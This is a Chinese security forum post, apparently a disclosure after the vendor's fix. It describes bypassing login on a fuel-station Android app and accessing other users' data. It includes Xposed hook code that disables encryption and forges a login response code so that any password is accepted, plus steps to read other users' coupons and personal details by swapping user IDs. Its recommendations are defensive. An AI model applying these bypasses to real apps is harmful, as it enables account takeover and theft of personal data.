
# [原创]记一次APP爆破登陆并平行越权实例及相关安全建议

旧帖重发，之前发过 开发方要求删除给他们时间修复BUG，现在BUG已经修复了，发出来大家交流交流，有错误的地方请大神们指导修正

记一次APP爆破登陆并平行越权

APP名称：加油广东 APP版本:3.2

准备工具： `DDMS`,`Fiddler`,`JEB 2.x`,`Android Studio`

## 1.) 初始分析

先配置好抓包环境并挂上代理抓包

登录帐号： `1392411****` 密码：任意字符

出现下图

![](https://bbs.kanxue.com/upload/attach/201709/309072_tmrw6mzl6mx55lc.png)

要求接短信验证码完善帐号信息，我们看看抓的登录包

![](https://bbs.kanxue.com/upload/attach/201709/309072_pihxwommokwqy94.png)

双向传输密文，没有看到任何明文看看POST参数表

![](https://bbs.kanxue.com/upload/attach/201709/309072_pgbp1c3tykuwhjw.png)

我们找别的请求看看

`isencrypt`

这个参数变化以后POST数据差异

![](https://bbs.kanxue.com/upload/attach/201709/309072_0vhkpw6k6i4b0v2.png)

可以看出`isencrypt` = 0则不通过`RSA+AES`交换数据

反编译看APP的流程：`APP`是360加固，需要先脱壳，这里略过不说

![](https://bbs.kanxue.com/upload/attach/201709/309072_03rb9e5qy0h9fv7.png)

看上图标注，

跳转到引用，可以看到是一个封装好的`HttpRequestUtils`工具类

![](https://bbs.kanxue.com/upload/attach/201709/309072_piw4bk3taog52ph.png)

继续深入`packageLogin`

![](https://bbs.kanxue.com/upload/attach/201709/309072_njdvou0cy2067vx.png)

继续往下看`addEncryptFlag`方法

为了方便理解，我修改了参数名称

![](https://bbs.kanxue.com/upload/attach/201709/309072_djxncan6hd344tj.png)

到这里登录的加密流程已经分析完了，我们通过Hook实现强制禁用`RSA+AES`交换数据

```
if (Param.packageName.equals("com.sunboxsoft.oilforgdandroid")){

//coord: (0,18,33) | addr:

Lnet/sourceforge/simcpux/httputils/HttpPackageParams;->addEncryptFlag(Ljava/util/Map;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/util/Map;

| loc: ?

Class<?> utils = XposedHelpers.findClass("net.sourceforge.simcpux.httputils.HttpPackageParams",Param.classLoader);

findAndHookMethod(utils, "addEncryptFlag", Map.class, String.class, String.class, String.class,

String.class, new XC_MethodHook()

{

@Override

protected void beforeHookedMethod(MethodHookParam

param) throws Throwable {

super.beforeHookedMethod(param);

HookUtils.asyncLogi(TAG,"replace isencrypt 0");

param.args[1] = "0";

}

});

}
```

重启，让插件生效再次抓登录包，还是那个帐号密码:任意字符

![](https://bbs.kanxue.com/upload/attach/201709/309072_90olpwl8us5szma.png)

发现虽然我们停留在登录页面并提示登录失败，但是服务器已经给我们返回了帐号信息

## 2) 爆破登录

我们返回`HttpRequestUtils`类的地方反向查找`postLogin`引用

![](https://bbs.kanxue.com/upload/attach/201709/309072_xfzr3ttibo460da.png)

有4个引用，这里就不一个一个看了我们从view入手确定调用

`DDMS Dump View Hierarchy`

![](https://bbs.kanxue.com/upload/attach/201709/309072_4s9ke1dy5k0djhj.png)

是个`FrameLayout`, 确定为引用3，点进去继续分析

![](https://bbs.kanxue.com/upload/attach/201709/309072_44jkmb1rblvpbdr.png)

因为网络状态是OK的，所以我们只看`onSuccess`

![](https://bbs.kanxue.com/upload/attach/201709/309072_g2ssscw1tpzg2ib.png)

`checkGroupNumLetter`方法正则检查密码是否符合规则

![](https://bbs.kanxue.com/upload/attach/201709/309072_sbwalt9ptxgafg3.png)

看解登录包的地方

![](https://bbs.kanxue.com/upload/attach/201709/309072_felwp3r1q6ca4wi.png)

好了，逻辑分析完了开始登录吧还是那道菜：HOOK

```
findAndHookMethod(JSONObject.class, "getString",String.class, new XC_MethodHook() {

@Override

protected void afterHookedMethod(MethodHookParam param) throws Throwable {

super.afterHookedMethod(param);

String str = (String) param.args[0];

if (str.equals("retcode")){

HookUtils.asyncLogi(TAG,"JSONObject getStringretcode " + param.getResult());

if (((String)param.getResult()).equals("RM")){

param.setResult("RR");

}

}

}

});
```

重启，让插件生效、登录

帐号：还是那个密码：任意符合`^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]+$`规则的字符

看登录结果

成功进入APP主页

![](https://bbs.kanxue.com/upload/attach/201709/309072_cyv3bvsnxpcduig.png)

资料页

![](https://bbs.kanxue.com/upload/attach/201709/309072_yn8fcnmqrc9wvpz.png)

优惠卷页：

![](https://bbs.kanxue.com/upload/attach/201709/309072_jckdk341ltst8rk.png)

## 3.) 平行越权

看电子卷的数据包

![](https://bbs.kanxue.com/upload/attach/201709/309072_ftltivlv6vukc2e.png)

`appuserid` `appsid` `gdsinopec-userid` `appsign` 四个参数

其中`appuserid` = `gdsinopec-userid`处于登录返回`userinfo`内

看源码`appsid` `appsign`实现：

![](https://bbs.kanxue.com/upload/attach/201709/309072_buhjkg7vywa2bj2.png)

可以看出这里面只有一个关键的`userid`参数

开始越权

![](https://bbs.kanxue.com/upload/attach/201709/309072_8i7bcpu1rd1lcsi.png)

![](https://bbs.kanxue.com/upload/attach/201709/309072_hr5aaqzibm7vjbo.png)

成功取到优惠卷信息了.. - -！

Over

## 总结：

影响范围：所有`retcode = RM` & `msg = 会员密码为空`的用户

泄漏：用户手机号、身份证号、油卡编号、优惠卷信息

安全建议：

1.服务器强制要求加密交换数据 `isencrypt`开关只建议用在debug 线上建议删除

2.删除不必要的返回数据

3.添加`token`避免越权

本文旨在技术交流，请勿用于他处谢谢

By:jiaqq02

QQ: 601865048

附上PDF

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

上传的附件：

- [加油广东APP爆破登陆并平行越权实例及相关安全建议.pdf](javascript:void(0);)

  （1.19MB，49次下载）
